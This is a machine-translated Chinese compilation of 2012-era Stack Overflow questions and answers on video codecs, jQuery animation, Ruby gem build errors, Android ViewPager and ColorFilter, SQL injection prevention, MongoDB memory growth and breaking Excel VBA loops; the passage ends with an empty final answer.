原因如下：我想在 C++/Java 中创建一个库或最终 2 个函数 - 编码 / 解码，它将获取任何类型文件的 RAW 二进制输入，并根据给定的密码或类似的东西对其进行编码/解码. 然后我需要把这个处理放在电影播放器​​和电影文件之间。最终结果将是一个受密码保护的 mp4 / avi / mpeg / wmv（并不重要）文件，只能使用此“编解码器”播放。编解码器的内部逻辑现在不是问题。

我如何想象它就像一个流，电影播放器​​请求文件并调用我的`encode()`函数，它获取文件的一部分，对其进行解码（它之前已被编码）并以 wmv/mp4 等格式返回正确的字节。

这有可能吗？怎么做？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-11T22:05:05.167

编解码器通常获取图像块和上下文信息，转换和量化数据，应用预测，然后使用任意数量的编码方案之一对生成的错误流进行编码。

API 通常很简单。对于编码，您将图像数据块（帧）发送到编码器，它会生成一个比特流。您可能负责自己编写容器（文件格式）。对于解码，您输入流位并输出帧。

绝对没有任何标准——编解码器中使用的技术有时是标准化的，但确切的接口不是。

MediaTool 简介是一个简单的应用程序编程接口 (API)，用于在 Java 中解码、编码和修改视频： [http ://wiki.xuggle.com/MediaTool_Introduction#How%5FTo%5Ftake%5FSnapshots%5FOf%5FYour%5FDesktop](http://wiki.xuggle.com/MediaTool_Introduction#How%5FTo%5FTake%5FSnapshots%5FOf%5FYour%5FDesktop)

Java 媒体框架教程： [http ://wwwinfo.deis.unical.it/fortino/teaching/gdmi0708/materiale/jmf2_0-guide.pdf](http://wwwinfo.deis.unical.it/fortino/teaching/gdmi0708/materiale/jmf2_0-guide.pdf)

也许对你有帮助！

# jquery - 无法与其他属性同时设置旋转动画，仅在 Safari（不是 Chrome）中

> ID：10114414
> 
> 赞同：2
> 
> 时间：2012-04-11T21:41:54.303
> 
> 标签：jquery, animation, safari

> **可能重复：**
> [Safari：绝对定位的 DIV 在通过 DOM 更新时不会移动](https://stackoverflow.com/questions/9471038/safari-absolutely-positioned-divs-not-moving-when-updated-via-dom)

[This answer](https://stackoverflow.com/a/5463375/291022) to another question解释了一个小技巧，可让您使用 jQuery 为元素的旋转设置动画。

在我的情况下，我想为元素的旋转与它的 top: 和 left: 属性同时设置动画。所以我想出了[这个小提琴](http://jsfiddle.net/s5Bqa/4/)。

```
function transformThing() {
    $('#thing').animate({ top: '+=50', left: '+=50', borderSpacing: -90 }, {
        step: function(now,fx) {
            if(fx.prop === 'borderSpacing') {
                $(this).css('-webkit-transform','rotate('+now+'deg)');
                $(this).css('-moz-transform','rotate('+now+'deg)'); 
                $(this).css('transform','rotate('+now+'deg)'); 
            }
        },
        duration: 1000
    }, 'swing');
}
$(document).ready(function() {
    $('#thing').click(function () {
        transformThing();
    });
}); 
```

单击正方形*应*旋转它并将其向下和向右移动。这就是它所做的，*除了*在 Safari 中。我在 Mac OS X 10.7.3 上运行 Safari 5.1.5，并且只有旋转动画。

一位同事发现[了这个 jQuery 插件](http://www.zachstronaut.com/posts/2009/08/07/jquery-animate-css-rotate-scale.html)，它可以让你用更简洁的语法做同样的事情，但它表现出同样的问题。

如果您查看 Web Inspector，您可以看到 top: 和 left: 值正在发生变化，实际上它们会更改为正确的值；但它们不会影响元素的视觉布局，除非您将它们关闭并再次打开。

显然，答案是“嗯，呃，这是一个 Safari 错误”。但是有没有更深入的解释可以帮助我找到解决方法，或者我可以尝试什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-15T16:32:27.817

简短的回答是它在野生动物园中不起作用。但好消息是，如果你使用像这个例子这样的画布，它工作得很好：http: [//beta.rallyinteractive.com/](http://beta.rallyinteractive.com/)工作动画旋转/变换/动画精灵。它真的是我能看到任何人给你的唯一类型的答案。

# ruby - “捆绑安装”中的错误

> ID：10114416
> 
> 赞同：1
> 
> 时间：2012-04-11T21:41:57.697
> 
> 标签：ruby, bundle, linecache

运行“捆绑安装”时出现此错误

```
Gem::Installer::ExtensionBuildError: ERROR: Failed to build gem native extension.

        /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/bin/ruby extconf.rb 
checking for vm_core.h... no

checking for vm_core.h... no

*** extconf.rb failed ***

Could not create Makefile due to some reason, probably lack of
necessary libraries and/or headers.  Check the mkmf.log file for more
details.  You may need configuration options.

Provided configuration options:
    --with-opt-dir
    --with-opt-include
    --without-opt-include=${opt-dir}/include
    --with-opt-lib
    --without-opt-lib=${opt-dir}/lib
    --with-make-prog
    --without-make-prog
    --srcdir=.
    --curdir
    --ruby=/var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/bin/ruby
    --with-ruby-dir
    --without-ruby-dir
    --with-ruby-include
    --without-ruby-include=${ruby-dir}/include
    --with-ruby-lib
    --without-ruby-lib=${ruby-dir}/lib
/var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:243:in `mkdir': Permission denied - /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/include/ruby-1.9.1/ruby-1.9.2-p318 (Errno::EACCES)
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:243:in `fu_mkdir'
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:217:in `block (2 levels) in mkdir_p'
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:215:in `reverse_each'
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:215:in `block in mkdir_p'
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:201:in `each'
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:201:in `mkdir_p'
    from /var/lib/jenkins/.rvm/gems/ruby-1.9.2-p318/gems/ruby_core_source-0.1.5/lib/ruby_core_source.rb:59:in `block in create_makefile_with_core'
    from /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/tempfile.rb:320:in `open'
    from /var/lib/jenkins/.rvm/gems/ruby-1.9.2-p318/gems/ruby_core_source-0.1.5/lib/ruby_core_source.rb:51:in `create_makefile_with_core'
    from extconf.rb:19:in `<main>'
Requesting http://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.2-p318.tar.gz
Downloading http://ftp.ruby-lang.org/pub/ruby/1.9/ruby-1.9.2-p318.tar.gz

Gem files will remain installed in /var/lib/jenkins/.bundler/tmp/19915/gems/linecache19-0.5.12 for inspection.
Results logged to /var/lib/jenkins/.bundler/tmp/19915/gems/linecache19-0.5.12/ext/trace_nums/gem_make.out
An error occured while installing linecache19 (0.5.12), and Bundler cannot continue.
Make sure that `gem install linecache19 -v '0.5.12'` succeeds before bundling. 
```

运行后我得到同样的错误`gem install linecache19 -v '0.5.12'`！

我搜索错误，但没有解决方案有效！

当我运行“chown -R jenkins /var/lib/jenkins/.rvm”时，我收到此错误：

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/ext”的所有权：不允许操作

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/test_case.rb”的所有权：不允许操作

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/deprecate.rb”的所有权：不允许操作

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/commands/update_command.rb”的所有权：不允许操作

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/commands/outdated_command.rb”的所有权：不允许操作

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/commands/uninstall_command.rb”的所有权：不允许操作

chown：更改“/var/lib/jenkins/.rvm/src/rubygems-1.8.21/lib/rubygems/commands/fetch_command.rb”的所有权：不允许操作
.....

当我用 sudo 运行命令时，什么也没有发生！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T23:13:37.840

这是缺少头文件的情况。

您需要为您的 ruby​​ 版本查找或下载 ruby​​ 源代码的副本，然后

```
gem install ruby-debug19 -- --with-ruby-include=path/to/ruby/source/ 
```

重新运行`bundle install`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:02:56.513

重要的一行是这一行：

```
/var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/lib/ruby/1.9.1/fileutils.rb:243:in `mkdir': Permission denied - /var/lib/jenkins/.rvm/rubies/ruby-1.9.2-p318/include/ruby-1.9.1/ruby-1.9.2-p318 (Errno::EACCES) 
```

显然，用户无法写入该目录。您应该确保`/var/lib/jenkins/.rvm`所有子对象都归 jenkins 用户所有。假设它是`jenkins`你可以运行

```
chown -R jenkins /var/lib/jenkins/.rvm
chmod -R u+rX /var/lib/jenkins/.rvm 
```

# android - 正确地将片段插入和删除到 viewpager

> ID：10114417
> 
> 赞同：9
> 
> 时间：2012-04-11T21:42:06.037
> 
> 标签：android, fragment, android-viewpager

我正在制作一个带有 viewpager 和片段的 android 应用程序。我想选择动态向寻呼机添加或删除片段页面。我有一个自定义 FragmentPagerAdapter：

```
public class MyAdapter extends FragmentPagerAdapter implements TitleProvider{

    protected final List<PageFragment> fragments;

    /**
    * @param fm
    * @param fragments
    */
    public MyAdapter(FragmentManager fm, List<PageFragment> fragments) {

        super(fm);
        this.fragments = fragments;
    }

    public void addItem(PageFragment f){
        fragments.add(f);
        notifyDataSetChanged();
    }

    public void addItem(int pos, PageFragment f){
        for(int i=0;i<fragments.size();i++){
            if(i>=pos){
                getSupportFragmentManager().beginTransaction().remove(getSupportFragmentManager().findFragmentByTag(getFragmentTag(i))).commit();
            }
        }
        fragments.add(pos,f);
        notifyDataSetChanged();
        pager.setAdapter(this);
        pager.setCurrentItem(pos);

    }

    public void removeItem(int pos){
        getSupportFragmentManager().beginTransaction().remove(getSupportFragmentManager().findFragmentByTag(getFragmentTag(pos))).commit();
        for(int i=0;i<fragments.size();i++){
            if(i>pos){
                getSupportFragmentManager().beginTransaction().remove(getSupportFragmentManager().findFragmentByTag(getFragmentTag(i))).commit();
            }
        }
        fragments.remove(pos);

        notifyDataSetChanged();
        pager.setAdapter(this);
        if(pos<fragments.size()){
            pager.setCurrentItem(pos);
        }else{
            pager.setCurrentItem(pos-1);
        }
    }

    @Override
    public Fragment getItem(int position) {
        return fragments.get(position).toFragment();
    }

    @Override
    public int getCount() {
        return fragments.size();
    }

    @Override
    public int getItemPosition(Object object) {
        return POSITION_NONE;
    }

    private String getFragmentTag(int pos){
        return "android:switcher:"+R.id.pager+":"+pos;
    }

    public String getTitle(int position) {
        String name =  fragments.get(position).getName();
        if(name.equals(""))
            return "- "+position+" -";
        return name;
    }
} 
```

我可以删除除 0 之外的任何片段。当我尝试删除它时，我在 notifyDataSetChanged(); 上得到了 NullPointerException；或在 pager.setAdapter(this); 如果我注释掉通知。

当我尝试插入新页面时，我也得到了 NullPointerException。当我将新页面添加到列表末尾时，它工作正常。我什至尝试在 Fragments.add(pos,f) 之后用这个来读取插入中的片段

```
 for(int i=0;i<fragments.size();i++){
            if(i>=pos){
                getSupportFragmentManager().beginTransaction().add(fragments.get(i).toFragment(),getFragmentTag(i-1)).commit();
            }
        } 
```

如果我使用`getFragmentTag(i-1)`我又得到了空指针。使用只是`i`我得到了非法状态异常，因为无法修改片段的标签。有了`beginTransaction().add(pager.getId,fragments.get(i).toFragment())`它仍然是空指针......

我的问题是：我做错了什么，如何才能正确完成？（也许：`notyfyDataSetChanged()`当导致空指针异常时从哪里获取数据？）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-21T21:41:26.097

这是我用来解决在实例化时标记片段的问题以及以前标记的片段在尝试添加或删除页面时无法更改 ViewPager 中的位置的事实，即出现异常：

> java.lang.IllegalStateException：无法更改片段 MyFragment{4055f558 id=0x7f050034 android:switcher:2131034164:3} 的标签：现在是 android:switcher:2131034164:3 android:switcher:2131034164:4

此适配器是使用预先列出的所有页面列表创建的，然后您可以使用 setEnabled(int position, boolean enabled) 禁用或启用在 ViewPager 中隐藏或显示这些页面的某些页面。

它通过维护所有片段的内部列表但暴露给 ViewPager 并仅映射启用片段的位置来工作。

```
public class DynamicFragmentPagerAdapter extends FragmentPagerAdapter {

    public final ArrayList<Fragment> screens = new ArrayList<Fragment>();

    private Context context;
    private List<AtomicBoolean> flags = new ArrayList<AtomicBoolean>();

    public DynamicFragmentPagerAdapter(FragmentManager fm, Context context, List<Class<?>> screens) {
        super(fm);
        this.context = context;

        for(Class<?> screen : screens)
            addScreen(screen, null);

        notifyDataSetChanged();
    }

    public DynamicFragmentPagerAdapter(FragmentManager fm, Context context, Map<Class<?>, Bundle> screens) {
        super(fm);
        this.context = context;

        for(Class<?> screen : screens.keySet())
            addScreen(screen, screens.get(screen));

        notifyDataSetChanged();
    }

    private void addScreen(Class<?> clazz, Bundle args) {
        screens.add(Fragment.instantiate(context, clazz.getName(), args));
        flags.add(new AtomicBoolean(true));
    }

    public boolean isEnabled(int position) {
        return flags.get(position).get();
    }

    public void setEnabled(int position, boolean enabled) {
        AtomicBoolean flag = flags.get(position);
        if(flag.get() != enabled) {
            flag.set(enabled);
            notifyDataSetChanged();
        }
    }

    @Override
    public int getCount() {
        int n = 0;
        for(AtomicBoolean flag : flags) {
            if(flag.get())
                n++;
        }
        return n;
    }

    @Override
    public Fragment getItem(int position) {
        return screens.get(position);
    }

    @Override
    public int getItemPosition(Object object) {
        return POSITION_NONE; // To make notifyDataSetChanged() do something
    }

    @Override
    public void notifyDataSetChanged() {
        try {
            super.notifyDataSetChanged();
        } catch (Exception e) {
            Log.w("", e);
        }
    }

    private List<Fragment> getEnabledScreens() {
        List<Fragment> res = new ArrayList<Fragment>();
        for(int n = 0; n < screens.size(); n++) {
            if(flags.get(n).get())
                res.add(screens.get(n));
        }
        return res;
    }

    @Override
    public Object instantiateItem(ViewGroup container, int position) {
        // We map the requested position to the position as per our screens array list
        Fragment fragment = getEnabledScreens().get(position);
        int internalPosition = screens.indexOf(fragment);
        return super.instantiateItem(container, internalPosition);
    }

    @Override
    public CharSequence getPageTitle(int position) {
        Fragment fragment = getEnabledScreens().get(position);
        if(fragment instanceof TitledFragment)
            return ((TitledFragment)fragment).getTitle(context);
        return super.getPageTitle(position);
    }

    public static interface TitledFragment {
        public String getTitle(Context context);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-02T20:56:46.803

我有一个适用于非基于片段的适配器的解决方案。看看[我的帖子](https://stackoverflow.com/questions/13664155/dynamically-add-and-remove-view-to-viewpager)，看看是否有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-08T23:01:06.977

> > 我可以删除除 0 之外的任何片段。

对我来说，如果只在 removeItem 的 for 循环中使用 >= 条件，它就可以工作：

```
 if (i >= pos){
          fm.beginTransaction().remove(fragments.get(i).getFragment()).commit();
      } 
```

# android - 使用 ShapedDrawable 将 ColorFilter 应用于 ImageView

> ID：10114420
> 
> 赞同：42
> 
> 时间：2012-04-11T21:42:12.847
> 
> 标签：android, drawable, android-imageview, colorfilter, shapedrawable

我有一个`ImageView`with`android:src`设置为 a `ShapedDrawable`，即一个白色圆圈。我想要的是`ImageView`在运行时对它进行着色以响应某些事件。`imgView.setColorFilter`似乎是解决方案，但是在使用这个（尝试了不同的参数）之后，图像变得不可见（我在屏幕上看不到它）。

如何解决这个问题？有没有更好的方法来制作色环？

* * *

## 回答 #1

> 赞同：108
> 
> 时间：2012-04-13T13:20:03.177

好吧，我快速玩了一下，发现你的圈子消失了。没有您描述您到底尝试*了什么*，我假设您还没有尝试将滤色器设置为`Drawable`本身？（与 s 相反`ImageView`，它似乎只适用于`BitmapDrawable`s）。

`ShapeDrawable`以下语句对于以白色为初始颜色的 xml 声明非常有效：

```
ImageView redCircle = (ImageView) findViewById(R.id.circle_red_imageview);
ImageView greenCircle = (ImageView) findViewById(R.id.circle_green_imageview);
ImageView blueCircle = (ImageView) findViewById(R.id.circle_blue_imageview);

// we can create the color values in different ways:
redCircle.getDrawable().setColorFilter(Color.RED, PorterDuff.Mode.MULTIPLY );
greenCircle.getDrawable().setColorFilter(0xff00ff00, PorterDuff.Mode.MULTIPLY );
blueCircle.getDrawable().setColorFilter(getResources().getColor(R.color.blue), PorterDuff.Mode.MULTIPLY ); 
```

为了`ShapeDrawable`完整性：（我在 上设置了大小`ImageView`，见下文）

```
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="oval" >
    <solid android:color="@android:color/white" />
</shape> 
```

并以其中一个`ImageView`为例：

```
<ImageView
    android:id="@+id/circle_red_imageview"
    android:layout_width="40dp"
    android:layout_height="40dp"
    android:padding="5dp"
    android:src="@drawable/circle_white" /> 
```

视觉结果：

![彩色圆圈截图](../Images/2a9b39f6cf091233e86e2d3ea0b14178.png)

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2015-12-14T11:53:29.617

如果要更改图像颜色，请使用

```
PorterDuff.Mode.SRC_ATOP instead
PorterDuff.Mode.MULTIPLY 
```

在上面的例子中。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2016-11-25T15:14:11.153

您可以在 xml 中使用 ImageView 中的属性`android:tint`。

例子：

```
<ImageView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:src="@drawable/your_drawable"
    android:tint="@color/your_color" /> 
```

> 在 Android 4.1.2 和 6.0.1 上测试

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-03-14T11:56:40.107

你可以使用这个库非常简单地做到这一点： [https ://github.com/jrvansuita/IconHandler](https://github.com/jrvansuita/IconHandler)

它将像这样工作：

```
Icon.on(yourImageView).color(R.color.your_color).icon(R.mipmap.your_icon).put(); 
```

# jquery - 在 Jquery 中设置 CSS 属性时如何使用变量？

> ID：10114421
> 
> 赞同：0
> 
> 时间：2012-04-11T21:42:25.030
> 
> 标签：jquery, css, jquery-mobile

我正在尝试使以下工作：

```
var $marPad = $('#wrapper').attr('id') == "overthrow" ? 
      ["margin-top", "margin-bottom"] : ["padding-top", "padding-bottom"];

$("#toBeSet").css({ 
    $marPad[0] : "100px", 
    $marPad[1] : "100px"
    }) 
```

通过这种方式，我希望只使用一个 css setter。然而，Firebug 总是告诉我我不能制作像这样的 CSS 选择器*$marPad[0]*。它总是返回**missing : 在属性 id 之后**。

有人能告诉我我做错了什么吗？是否也可以使用变量而不是固定的 CSS 选择器？

感谢帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T21:45:46.387

您需要首先创建对象，然后向其添加属性。

```
var obj = {}; 

obj[$marPad[0]] = '100px';
obj[$marPad[1]] = '100px';

$("#toBeSet").css(obj); 
```

也许更好的是首先将其作为条件语句的一部分......

```
var $marPad = $('#wrapper').attr('id') == "overthrow" ? 
      {marginTop:'100px', marginBottom: '100px'} : {paddingTop:'100px', paddingBottom:'100px'};

$("#toBeSet").css($marPad); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T21:52:32.380

`key`不评估对象文字定义的部分。也就是说，你不能做这样的事情：

```
x = {
  1 + 1: 'foo'
}; 
```

即使您并不总是需要引号，左侧也被视为字符串标识符。随之而来的是不评估变量：

```
foo = 'bar';
x = {
  foo: 'my value'
}
x.bar === undefined;
x.foo === 'my value'; 
```

评估表达式的唯一方法是使用方括号表示法：

```
foo = 'bar';
x = {};  // an empty object
x[foo] = 'my value';    // <-- foo is evaluated, returns the string value 'bar'

x.bar === 'my value';
x.foo === undefined;

// and to clarify:
x['foo'] === undefined;
x[foo] === 'my value' 
```

因此，要直接回答您的问题，正如@am not 我所说的那样，您应该执行以下操作：

```
obj = {};
obj[$marPad[0]] = "100px"; 
obj[$marPad[1]] = "100px";
$('#toBeSet').css(obj); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T21:45:29.210

尝试：

```
$("#toBeSet").css($marPad[0], "100px").css($marPad[1], "100px"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T21:46:41.960

您不能将变量用作对象文字中的名称。创建对象并向其添加属性：

```
var o = {};
o[$marPad[0]] = "100px";
o[$marPad[1]] = "100px";

$("#toBeSet").css(o) 
```

# c# - 防止非执行 SQL 中的 SQL 注入

> ID：10114424
> 
> 赞同：2
> 
> 时间：2012-04-11T21:42:44.887
> 
> 标签：c#, sql-server, sql-server-2008-r2, sql-injection

我正在调用一个 Web 服务并将其传递给动态生成的 SQL 字符串。此字符串包含用户输入。它目前正在使用简单的字符串连接构建，因此容易受到 SQL 注入攻击。我不能使用正常的参数化 SQL 解决方案，因为我没有从我的应用程序执行命令。

我的第一次尝试是构建一个参数化的 SqlCommand 对象。但是，似乎没有任何方法可以提取最终的 SQL 语句。我的第二次尝试是使用[sp_executesql](http://msdn.microsoft.com/en-us/library/ms175170.aspx)，但这似乎与我的原始代码存在相同的问题：将 SQL 命令与用户输入连接在一起。

那么，如何在不编写自己的输入清理逻辑的情况下生成 SQL（即`.Replace("'", "''")`？是否有可用的内置类或良好的第三方库？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T17:41:04.353

据我了解这个问题......如何在不编写我自己的输入清理逻辑的情况下生成 SQL。有几种 sql 注入缓解技术需要考虑使用。其中一些是基于后端的安全性，而另一些则是由数据库引擎强制执行的业务和应用程序开发规则。

后端安全：始终应用“最低权限”规则：为访问 DBMS 的应用程序设置低权限数据库帐户。服务器端卫生：在服务器端。验证用户提供的数据——以及从潜在不安全的来源获得的任何数据客户端输入验证可能很有用

客户端：不要向用户返回 SQL 错误消息，因为它们包含对攻击者有用的信息，例如有关目标表甚至其内容的查询或详细信息。在 Java 中使用异常处理可以很容易地防止这种情况发生。

客户端：使用 Base64 等双向函数将可能包含有问题字符的文本输入字段编码为字母数字版本。

客户端：主动编写代码以防止 SQL 注入。通过两步过程过滤所有输入数据。首先，在用户输入集合（例如，Web 表单）中应用白名单过滤：仅允许与字段相关的字符、字符串格式和数据类型；限制字符串长度。然后，在生成 SQL 查询之前，应在数据访问层应用黑名单过滤或转义：转义 SQL 元字符和关键字/运算符。

客户端或中间层：使用严格的白名单过滤验证动态生成的数据库对象名称（例如表名称）。

客户端避免引用/分隔标识符，因为它们会使所有白名单、黑名单和转义工作变得非常复杂。

开发：强制流程为开发人员提供一个安全的 API，该 API 将负责安全性并避免 SQL 注入。这样做而不是依赖开发人员来实现复杂的防御性编码技术。

API：开发一个 API 或 middel 层，在编译时分析数据库模式，并为一组自定义的 SQL 查询构造类编写代码（然后集成到 IDE 中，并由开发人员直接调用以构建 SQL 查询）。结果是基于通用模板的树状结构，根据表和列定义映射 SQL 查询的可能变化。有 3 种主要类型的类：SQL 语句、表列和 where 条件。这些类具有映射数据库模式中数据类型的强类型方法。攻击面减少。建议的 API 不会执行您在问题中指定的查询，它只会生成 SQL。提议的 API 将在输入值提交时根据其映射检查数据类型。第二，该查询将由特定于 DBMS 的驱动程序使用 JDBC 的 PreparedStatement 接口和绑定变量进行预编译。任一步骤中的任何错误都将阻止查询的执行。

开发人员使用的提议的 API 设计将解决服务器端验证、SQL 错误拦截。直接强制执行强类型，而不需要文本输入编码和两步输入验证，因为动态输入是通过 PreparedStatement 接口通过单独的受保护数据通道（绑定变量）注入的。对象名称不是由用户输入的，而是经过例行验证的。但是，仍应向提议的 API 提供低权限的数据库帐户。

在提议的 API 中，不需要识别数据输入入口点，因为在数据库交互之前应用了保护。完全支持分段查询；由于每个查询修改都由 API 验证，因此可以确保它们的安全性。白过滤和黑名单是不必要的，因为动态输入是使用绑定变量指定的。

在提议的 API 中，列长度（例如，对于 varchar 字段）可以存储在 DB 类中（就像名称和数据类型一样），从而允许解决方案对输入数据执行边界验证，从而提高其保护级别和整体准确性。

类似 API 设计的基于 Java 的原型正在开发中，并且正在进行研究。

# iphone - 同一个单例类的方法名称部分？

> ID：10114430
> 
> 赞同：0
> 
> 时间：2012-04-11T21:43:33.173
> 
> 标签：iphone, ios, singleton

我有一个类，在那个类中我设置了一个单例模式并有一个方法，这是一个简短的例子。

```
#pragma mark Singleton Methods
+ (id)sharedManager {
    @synchronized(self) {
        if (sharedMyManager == nil)
            sharedMyManager = [[self alloc] init];
    }
    return sharedMyManager;
}
- (id)init {
    if (self = [super init]) {
//so some init stuff here
//...
}

-(void)savemethod {
//etc etc
} 
```

我想知道我是否要像这样调用/初始化要使用的单例类

```
//set up plist controller class as a singleton so that you dont loose cache numbers etc
    EnginePropertiesController *enginePC = [EnginePropertiesController sharedManager]; 
```

然后稍后在我初始化单例的同一个类中，我调用了保存方法......

[enginePC 保存方法];

那么我想知道 saveMethod 是同一个实例的一部分吗？我认为这是因为我使用了相同的初始化名称 enginePC.. 但希望对此进行一些澄清。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:48:36.913

如果我理解你，你是正确的，这`saveMethod`将在单例实例上调用。您命名的指针与它指向的内容无关。

# mongodb - 分布式写入作业使带有 MongoDB 服务器的远程机器崩溃

> ID：10114431
> 
> 赞同：0
> 
> 时间：2012-04-11T21:43:36.050
> 
> 标签：mongodb, python-2.7, windows-server-2008-r2, pymongo, distributed-transactions

寻找我能得到的任何建议。

我有 16 个虚拟 CPU，全部写入单个远程 MongoDB 服务器。正在写入的机器是具有 32GB RAM 的 64 位机器，运行 Windows Server 2008 R2。一段时间后，所有 CPU 都停止冷却（不会逐渐降低性能），任何获取远程桌面连接的尝试都会挂起。

我是通过 pymongo 从 Python 写的，插入语句是“[collection].insert([document], safe=True)”

随着分布式写入作业的进行，我决定更积极地监控我的服务器，不时远程访问并检查任务管理器。我看到的是稳定的内存蠕变，从 0.0GB 一直到 29.9GB，以相当线性的方式。因此，我的主要理论是我的写作正在填满内存并最终压倒机器。

我错过了一些非常基本的东西吗？我是 MongoDB 的新手，但我记得在写入 MySQL 数据库时，插入通常跟在提交之后，提交语句实际上确保写入记录。在这里我没有做任何提交......？

谢谢，

戴夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-14T20:39:48.383

尝试关闭日记功能，看看问题是否仍然存在。

# android - 可以对“项目”反射类的可见性做些什么吗？

> ID：10114439
> 
> 赞同：0
> 
> 时间：2012-04-11T21:44:59.810
> 
> 标签：android, renderscript

是否有理由在 RenderScript 结构的反射“项目”类中使用默认可见性修饰符？具体来说，我想在绑定根脚本的包之外的包中创建这些项目。由于包管理组织的原因，我希望能够从其他包访问一些反映的数据类型，这样我就不需要创建访问类，如果可能的话。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T17:28:06.673

根据谷歌在一次 Android 开发者视频群聊中收到的回答，由于 RenderScript 工具链的工作原理，除非他们决定更改它，否则开发者无能为力。

# vba - 当键盘上没有中断键时excel VBA中断执行

> ID：10114447
> 
> 赞同：24
> 
> 时间：2012-04-11T21:45:33.500
> 
> 标签：vba, excel, keyboard

我只是注意到在我的笔记本电脑（戴尔 XPS 15z）上没有 BREAK 键（没有专用的数字键盘）。我正在逐步运行调试器，然后当一切看起来都很好时，我就让它发挥作用。但是，它在无限循环中运行，现在我意识到没有 break 键就无法停止它！！！！

这是一个坏笑话吗？我不得不重新启动计算机；有没有更优雅的方式？？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-04-17T22:53:19.413

只需按两次退出键;-)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2017-09-22T07:48:28.583

**解决方案＃1（它在大多数情况下都有效）：** 当键盘上缺少某些特定键 (`Pause`或`Break`并按`ScrLk)`2、3`Esc`或多次时也不会停止宏。

*步骤#01*：如果您的键盘没有特定键，请不要担心并通过按`Win`+打开 Windows 实用程序中的“屏幕键盘” `U`。

*步骤#02*：现在，尝试以下任何选项，它们肯定会根据您的系统架构工作，即操作系统和 Office 版本

*   `Ctrl`+`Pause`
*   `Ctrl`+`ScrLk`
*   `Esc`+ `Esc`（连续按两次）

您将使用上述组合键进入中断模式，因为宏会立即暂停执行以完成当前任务。例如。如果它正在从网络上提取数据，那么它将在执行任何下一个命令之前立即停止，但在提取数据之后，可以按下`F5`或`F8`继续调试。

* * *

当解决方案 #1 不起作用或您需要永久解决方案时，请尝试向注册表添加新 KEY。（我在戴尔 3530 Inspiron 笔记本电脑上运行 Win 10 Creators Update）

***免责声明***：请您自行承担更改 Windows 注册表的风险，并且仅当您是 Windows 管理员或有更改注册表中的键值的经验时才建议这样做。

您还可以寻找使用辅助功能键盘的解决方案 #2 `Win`+`U`

**解决方案#2：** 1) 单击开始，然后在搜索框中键入 REGEDIT。这将启动注册表编辑器。

2）探索注册表，展开每个元素 HKEY_LOCAL_MACHINE -SYSTEM -Current Control Set - Control - Keyboard Layout

单击 Scancode Map，然后编辑键值以匹配如下所示。即具有以下值：00,00,00,00,00,00,00,00,02,00,00,00,46,e0,44,00,00,00,00,00

完成后，您需要重新启动笔记本电脑，但之后，您可以将其用作暂停/中断键。

要详细了解它并根据您的需要对其进行自定义，请参阅此链接：[键盘扫描码](http://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html#ss1.4)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2018-09-04T22:44:14.823

我有一个没有**Pause/Break**键的 Dell Precision，但有一个替代品：**Fn + B**，所以：

- `Fn`+ `B`== `Pause`(pause execution);
- `Ctrl`+ `Fn`+ `B`== `Break`（中断执行）；
- `Win`+ `Fn`+ `B`== `Windows`+ `Pause`（打开系统属性）。

您可以执行以下命令：

```
dir /s C:\ 
```

并在 dir 列出驱动器 C 中的所有文件时测试 Pause 和 Break 组合键。

[参考](https://www.pcreview.co.uk/threads/keyboard-alternative-to-break.3759101/#post-14268707)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-10-13T13:30:55.313

